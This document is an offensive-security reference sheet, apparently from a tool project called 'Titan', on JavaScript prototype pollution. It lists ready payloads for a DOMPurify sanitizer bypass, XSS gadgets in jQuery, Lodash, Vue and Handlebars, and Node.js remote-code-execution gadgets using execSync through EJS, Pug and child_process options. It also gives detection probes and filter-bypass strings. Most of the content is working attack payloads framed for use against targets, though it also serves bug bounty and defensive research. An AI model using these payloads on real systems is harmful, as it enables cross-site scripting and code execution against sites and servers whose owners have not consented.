# Prototype Pollution Master Reference - Titan Arsenal

## 🔥 CVE-2026-41238: DOMPurify PP to XSS (April 2026)
- **Affected**: DOMPurify 3.0.1 through 3.3.3
- **Fixed**: DOMPurify 3.4.0
- **Impact**: XSS bypass via prototype pollution chain
- **Mechanism**: `cfg.CUSTOM_ELEMENT_HANDLING || {}` fallback inherits from Object.prototype
- **Requirement**: PP primitive that can inject RegExp instances (postMessage, server-side PP)
- **Payload**: `Object.prototype.tagNameCheck = /.*/; Object.prototype.attributeNameCheck = /.*/;`
- **Result**: All custom elements and attributes pass sanitization
- **Titan Value**: Can bypass DOMPurify on targets using vulnerable versions

## 📊 Key Research Papers
1. **GALA** - Found 133 zero-day gadgets on 1 million websites
2. **ProbetheProto** - 2,738 vulnerable websites, 48 XSS, 736 cookie manipulation
3. **GHunter** - 56 new gadgets in Node.js, 67 in Deno
4. **Silent Spring** - CodeQL queries for server-side PP gadgets

## 🎯 Client-Side PP → XSS Gadgets

### jQuery (pre-3.4.0, CVE-2019-11358)
```
Polluted Property | Payload | Trigger | Impact
innerHTML | " " | DOM manipulation | XSS
src | "javascript:alert(1)" | Element creation | XSS
href | "javascript:alert(1)" | Link creation | XSS
```

### Lodash (pre-4.17.21)
```
Polluted Property | Payload | Trigger | Impact
sourceURL | "\u000ajavascript:alert(1)//" | _.template() | XSS
template | Template string | _.template() | Code injection
```

### Vue.js
```
Polluted Property | Payload | Trigger | Impact
v-if | _c.constructor('alert(1)')() | Template render | XSS
v-bind:class | ''.constructor.constructor('alert(1)')() | Template render | XSS
```

### Handlebars
```
Polluted Property | Payload | Trigger | Impact
type | "Program" with malicious body | Handlebars.compile() | RCE
allowProtoMethodsByDefault | true | Any template render | Prototype access
```

### DOMPurify (CVE-2026-41238)
```
Polluted Property | Payload | Trigger | Impact
tagNameCheck | /.*/ | DOMPurify.sanitize() | XSS bypass
attributeNameCheck | /.*/ | DOMPurify.sanitize() | XSS bypass
```

## 🖥️ Server-Side PP → RCE (Node.js)

### child_process.spawn
```
Polluted Property | Payload | Trigger | Impact
shell | "/proc/self/exe" | spawn() | RCE
argv0 | "console.log(require('child_process').execSync('id'))" | spawn() | RCE
env.NODE_OPTIONS | "--require /proc/self/fd/0" | spawn() | RCE
```

### Template Engines
```
Engine | Property | Payload | Impact
EJS | outputFunctionName | "x);process.mainModule.require('child_process').execSync('id');" | RCE
Pug | block | {"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"} | RCE
Handlebars | type | "Program" with malicious body | RCE
Nunjucks | type | "Code" with malicious value | RCE
```

### Express.js
```
Property | Detection | Impact
json spaces | {"__proto__":{"spaces":2}} → check pretty-print | DoS/Info
status | {"__proto__":{"status":555}} → check response code | DoS
```

## 🔍 Detection Techniques

### Client-Side
1. URL parameters: `?__proto__[test]=polluted`
2. Hash fragments: `#__proto__[test]=polluted`
3. Constructor chain: `?constructor.prototype.test=polluted`
4. JSON body: `{"__proto__":{"test":"polluted"}}`
5. DOM Invader (Burp Suite)

### Server-Side (Node.js)
1. JSON spaces: `{"__proto__":{"spaces":2}}`
2. Status code: `{"__proto__":{"status":555}}`
3. JSON serial: `{"__proto__":{"replacer":null}}`

## 🛡️ Bypasses
1. Alternative paths: `constructor[prototype]`, `constructor.prototype`
2. Nested pollution: `{"constructor":{"prototype":{"key":"value"}}}`
3. String manipulation: `__pro__proto__to__` → filter removes → `__proto__`
4. Type confusion: RegExp instances bypass string filters

## 💰 Bug Bounty Payouts
- Standalone PP: $200-$500
- PP + XSS: $1,000-$3,000
- PP + RCE: $5,000-$25,000+

## 🎯 Titan Integration Priority
1. **HIGH**: PPScan integration for detection
2. **HIGH**: Gadget database for escalation
3. **MEDIUM**: Server-side PP detection
4. **MEDIUM**: DOMPurify bypass detection
5. **LOW**: Template engine gadget chains
